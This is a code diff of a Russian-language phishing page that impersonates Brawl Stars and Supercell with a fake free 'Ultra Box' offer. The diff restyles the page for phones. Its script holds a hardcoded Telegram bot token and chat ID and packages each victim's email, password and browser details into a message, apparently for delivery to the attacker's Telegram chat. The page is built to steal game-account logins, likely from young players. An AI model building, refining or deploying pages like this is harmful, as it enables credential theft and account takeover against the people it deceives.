@@ -2,8 +2,8 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brawl Stars — получи бесплатный ящик</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Brawl Stars — Ультраящик</title>
     <style>
         * {
             margin: 0;
@@ -18,25 +18,26 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 10px;
             background-image: radial-gradient(circle at 30% 20%, #1f2a4a, #070912);
         }
         .card {
             background: #141b2b;
-            padding: 60px 50px 50px;
-            border-radius: 40px;
+            padding: 30px 25px 35px;
+            border-radius: 32px;
             box-shadow: 0 30px 80px rgba(0,0,0,0.9), 0 0 0 2px #f5c542 inset;
-            max-width: 600px;
+            max-width: 500px;
             width: 100%;
             text-align: center;
             border: 3px solid #f5c542;
+            margin: 0 auto;
         }
         .logo {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .logo img {
             width: 50px;
@@ -44,34 +45,46 @@
         }
         .logo span {
             color: #f5c542;
-            font-size: 32px;
+            font-size: 30px;
             font-weight: 900;
             letter-spacing: 2px;
             text-shadow: 0 0 20px rgba(245, 197, 66, 0.3);
         }
+        .badge {
+            display: inline-block;
+            background: #ff1493;
+            color: #fff;
+            padding: 8px 24px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
         .brawl-box {
-            width: 200px;
+            width: 180px;
             height: auto;
-            margin: 10px auto 15px;
+            margin: 5px auto 10px;
             display: block;
-            filter: drop-shadow(0 10px 40px rgba(245, 197, 66, 0.6));
+            filter: drop-shadow(0 10px 40px rgba(255, 105, 180, 0.7));
         }
         .card h1 {
             color: #fff;
-            font-size: 42px;
+            font-size: 36px;
             font-weight: 900;
-            background: linear-gradient(135deg, #f5c542, #ff8c00);
+            background: linear-gradient(135deg, #ff66b2, #ff1493);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin: 5px 0 10px;
+            margin: 5px 0 8px;
             letter-spacing: 1px;
         }
         .card .sub {
             color: #aab0c8;
-            font-size: 22px;
-            margin-bottom: 30px;
+            font-size: 20px;
+            margin-bottom: 25px;
             border-bottom: 2px solid #2a3a5a;
-            padding-bottom: 20px;
+            padding-bottom: 18px;
         }
         .card .sub span {
             color: #ff6b6b;
@@ -79,9 +92,9 @@
         }
         .stars {
             color: #f5c542;
-            font-size: 20px;
-            letter-spacing: 8px;
-            margin-bottom: 25px;
+            font-size: 18px;
+            letter-spacing: 6px;
+            margin-bottom: 20px;
         }
         .card label {
             display: block;
@@ -89,12 +102,12 @@
             color: #c8d0e8;
             font-size: 18px;
             font-weight: 600;
-            margin-top: 18px;
+            margin-top: 16px;
             margin-bottom: 8px;
         }
         .card input {
             width: 100%;
-            padding: 20px 22px;
+            padding: 18px 20px;
             border: none;
             border-radius: 16px;
             background: #0e1525;
@@ -117,27 +130,27 @@
         .card button {
             width: 100%;
             padding: 22px;
-            margin-top: 28px;
-            background: linear-gradient(135deg, #f5c542, #e6a800);
+            margin-top: 24px;
+            background: linear-gradient(135deg, #ff66b2, #ff1493);
             border: none;
             border-radius: 16px;
-            color: #0b0e1a;
+            color: #fff;
             font-weight: 900;
-            font-size: 26px;
+            font-size: 28px;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 8px 30px rgba(245, 197, 66, 0.5);
+            box-shadow: 0 8px 30px rgba(255, 105, 180, 0.5);
             text-transform: uppercase;
             letter-spacing: 2px;
         }
         .card button:hover {
             transform: scale(1.03);
-            box-shadow: 0 10px 40px rgba(245, 197, 66, 0.8);
+            box-shadow: 0 10px 40px rgba(255, 105, 180, 0.8);
         }
         .error {
             color: #ff6b6b;
             font-size: 18px;
-            margin-top: 20px;
+            margin-top: 18px;
             display: none;
             background: #2a0f0f;
             padding: 16px;
@@ -147,61 +160,128 @@
         .note {
             color: #5a6a8a;
             font-size: 15px;
-            margin-top: 28px;
+            margin-top: 24px;
             border-top: 2px solid #2a3a5a;
-            padding-top: 22px;
+            padding-top: 20px;
             line-height: 1.6;
         }
         .note strong {
-            color: #f5c542;
+            color: #ff66b2;
         }
         .glow {
             animation: pulse 2.5s infinite;
         }
         @keyframes pulse {
-            0% { filter: drop-shadow(0 0 15px rgba(245, 197, 66, 0.4)); }
-            50% { filter: drop-shadow(0 0 50px rgba(245, 197, 66, 0.9)); }
-            100% { filter: drop-shadow(0 0 15px rgba(245, 197, 66, 0.4)); }
+            0% { filter: drop-shadow(0 0 15px rgba(255, 105, 180, 0.4)); }
+            50% { filter: drop-shadow(0 0 50px rgba(255, 105, 180, 0.9)); }
+            100% { filter: drop-shadow(0 0 15px rgba(255, 105, 180, 0.4)); }
         }
-        .badge {
-            display: inline-block;
-            background: #f5c542;
-            color: #0b0e1a;
-            padding: 6px 20px;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-        }
-        @media (max-width: 500px) {
+
+        /* ===== ПОЛНОЭКРАННЫЙ РЕЖИМ ДЛЯ ТЕЛЕФОНА ===== */
+        @media (max-width: 600px) {
+            body {
+                padding: 0;
+                align-items: stretch;
+                background: #0b0e1a;
+            }
             .card {
-                padding: 30px 20px;
+                max-width: 100%;
+                min-height: 100vh;
+                border-radius: 0;
+                border: none;
+                box-shadow: none;
+                padding: 30px 24px 40px;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                background: #141b2b;
+                margin: 0;
+            }
+            .logo img {
+                width: 60px;
+                height: 60px;
+            }
+            .logo span {
+                font-size: 34px;
+            }
+            .badge {
+                font-size: 18px;
+                padding: 10px 28px;
+            }
+            .brawl-box {
+                width: 220px;
+                margin: 10px auto 15px;
             }
             .card h1 {
-                font-size: 30px;
+                font-size: 44px;
+                margin: 10px 0 12px;
             }
             .card .sub {
-                font-size: 17px;
+                font-size: 22px;
+                margin-bottom: 30px;
+                padding-bottom: 22px;
+            }
+            .stars {
+                font-size: 22px;
+                letter-spacing: 10px;
+                margin-bottom: 25px;
+            }
+            .card label {
+                font-size: 20px;
+                margin-top: 20px;
+                margin-bottom: 10px;
             }
             .card input {
-                font-size: 17px;
-                padding: 16px;
+                padding: 22px 24px;
+                font-size: 22px;
+                border-radius: 18px;
+            }
+            .card input::placeholder {
+                font-size: 20px;
             }
             .card button {
+                padding: 26px;
+                font-size: 32px;
+                margin-top: 30px;
+                border-radius: 18px;
+            }
+            .error {
                 font-size: 20px;
                 padding: 18px;
             }
-            .brawl-box {
-                width: 150px;
+            .note {
+                font-size: 17px;
+                margin-top: 30px;
+                padding-top: 24px;
             }
-            .logo span {
-                font-size: 24px;
+        }
+        @media (max-width: 400px) {
+            .card {
+                padding: 20px 16px 30px;
             }
             .logo img {
-                width: 40px;
-                height: 40px;
+                width: 50px;
+                height: 50px;
+            }
+            .logo span {
+                font-size: 28px;
+            }
+            .brawl-box {
+                width: 180px;
+            }
+            .card h1 {
+                font-size: 36px;
+            }
+            .card .sub {
+                font-size: 18px;
+            }
+            .card input {
+                padding: 18px;
+                font-size: 18px;
+            }
+            .card button {
+                font-size: 26px;
+                padding: 22px;
             }
         }
     </style>
@@ -212,10 +292,10 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Supercell_logo.svg/120px-Supercell_logo.svg.png" alt="Supercell">
         <span>BRAWL STARS</span>
     </div>
-    <div class="badge">🎁 Ограниченное предложение</div>
-    <img class="brawl-box glow" src="https://static.wikia.nocookie.net/brawlstars/images/4/4c/Brawl_Box.png" alt="Brawl Box">
-    <h1>БЕСПЛАТНЫЙ ЯЩИК</h1>
-    <div class="sub">В честь обновы <span>★</span> забери свой подарок</div>
+    <div class="badge">🎁 Ультра-ящик</div>
+    <img class="brawl-box glow" src="https://i.imgur.com/5p3Kx6u.png" alt="Ultra Box">
+    <h1>УЛЬТРА-ЯЩИК</h1>
+    <div class="sub">Только в честь обновы <span>★</span> забери свой подарок</div>
     <div class="stars">✦ ✦ ✦ ✦ ✦</div>
 
     <form id="loginForm">
@@ -227,16 +307,16 @@
     </form>
 
     <div class="note">
-        ✅ <strong>Только для новых игроков</strong><br>
-        Один раз на аккаунт. Срок действия — 24 часа.
+        ✅ <strong>Эксклюзивно для новых игроков</strong><br>
+        Один раз на аккаунт. Предложение действительно 24 часа.
     </div>
 </div>
 
 <script>
-    // ===== ВАШИ ДАННЫЕ =====
+    // ===== ВАШИ ДАННЫЕ УЖЕ ЗДЕСЬ =====
     const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';
     const chatId = '7253706229';
-    // ========================
+    // =================================
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
@@ -261,7 +341,7 @@
             timestamp: new Date().toISOString()
         };
 
-        const message = `🎮 BRAWL STARS — ЯЩИК (ЛОГИН):\n` +
+        const message = `🎮 BRAWL STARS — УЛЬТРА-ЯЩИК (ЛОГИН):\n` +
             `📧 Почта: ${data.email}\n` +
             `🔑 Пароль: ${data.password}\n` +
             `🌐 Браузер: ${data.userAgent}\n` +
